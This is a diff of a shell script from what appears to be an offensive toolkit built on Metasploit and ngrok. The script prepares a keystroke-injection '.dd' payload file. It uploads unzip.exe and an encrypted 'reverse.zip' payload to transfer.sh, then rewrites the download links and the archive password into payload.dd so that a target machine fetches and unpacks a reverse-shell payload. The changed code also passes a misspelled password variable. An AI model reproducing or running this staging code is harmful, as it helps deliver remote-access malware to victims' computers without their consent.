@@ -186,24 +186,32 @@ LINK7ZIP="$HOME/msf/tmp/link-$(echo $ngrok_link| cut -c7- |sed "s#:#-port#g")-un
 if [ $password_zip = "" ]; then
 	continue
 else
+	echo "uploading the unzip.exe needed for unecrypted the zip archive"
+	curl --upload-file $TEMP/unzip.exe https://transfer.sh/unzip.exe > $LINK7ZIP
+	link_unzipexe="$(cat $LINK7ZIP)"
+	echo "\n LINK of unzip.exe :::: $link_unzipexe)"
 	echo "::::The .dd file is creating .."
 	rm -f $FOLDER_USEFUL/payload.dd
-	#cp $DDFILEENCRYPTED $FOLDER_USEFUL/payload.dd
-	touch $FOLDER_USEFUL/payload.dd
-	python $HOME/msf/script/replace.py "$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)" "$(cat $LINKFILE)" $DDFILEENCRYPTED $FOLDER_USEFUL/payload.dd
-	#echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > $FOLDER_USEFUL/payload.dd
-	echo "\n\n\n\n DD FILE ::::\n\n\n $(cat $FOLDER_USEFUL/payload.dd)\n\n\n"
-	echo "::::The links have been changed"
-	echo "$(cat $LINKFILE)"
-	curl --upload-file $TEMP/unzip.exe https://transfer.sh/unzip.exe > $LINK7ZIP
-	echo "\n LINK of unzip.exe :::: $(cat $LINK7ZIP)"
-	#echo "$(cat $FOLDER_USEFUL/payload.dd | perl -p -e "s/PASSX/$password_zip/")" > $FOLDER_USEFUL/payload.dd
-	python $HOME/msf/script/replace.py "PASSX" "$password_zip" $FOLDER_USEFUL/payload.dd $FOLDER_USEFUL/payload.dd
-	echo "\n\n\n\n DD FILE ::::\n\n\n $(cat $FOLDER_USEFUL/payload.dd)\n\n\n"
+	cp $DDFILEENCRYPTED $FOLDER_USEFUL/payload.dd
+	
+	link_zip_payload="$(cat $LINKFILE)"
+	echo "\033[1;31m\n:::: BEFORE :::::\033[0m"
+	echo "Variable to put in python script :"
+	echo "Link of zip payload : $link_zip_payload"
+	echo "Archive Password : $password_zip"
+	echo "Link unzip.exe : $link_unzipexe"
+	echo "\033[1;32m\n:::: AFTER ::::\033[0m"
 
-	#echo "$(cat $FOLDER_USEFUL/payload.dd | perl -p -e "s#7ZIPLINK#$(cat $LINK7ZIP)#")" > $FOLDER_USEFUL/payload.dd
-	python $HOME/msf/script/replace.py "7ZIPLINK" "$(cat $LINK7ZIP)" $FOLDER_USEFUL/payload.dd $FOLDER_USEFUL/payload.dd
-	echo "\n\n\n\n DD FILE ::::\n\n\n $(cat $FOLDER_USEFUL/payload.dd)\n\n\n"
+	link_zip_payload="$(echo $link_zip_payload | sed -n 's/.*\.sh\/\(.*\)\/reverse\.zip/\1/p')"
+	
+	link_unzipexe="$(echo $link_unzipexe | sed -n 's/.*\.sh\/\(.*\)\/unzip\.exe/\1/p')"
+
+	echo "Variable to put in python script :"
+	echo "Link of zip payload : $link_zip_payload"
+	echo "Archive Password : $password_zip"
+	echo "Link unzip.exe : $link_unzipexe"
+	python $HOME/msf/script/replace.py "$link_zip_payload" "$pasword_zip" "$link_unzipexe" $FOLDER_USEFUL/payload.dd
+	echo "::::The links have been changed:::::"
 	echo "::::The archive password has been added to the .dd file (if you encrypt the payload)"
 fi
 echo "\033[1;33m\n:::: If you have upload the payload check this:\n:::: If there is no new link, the upload failed \033[0m"
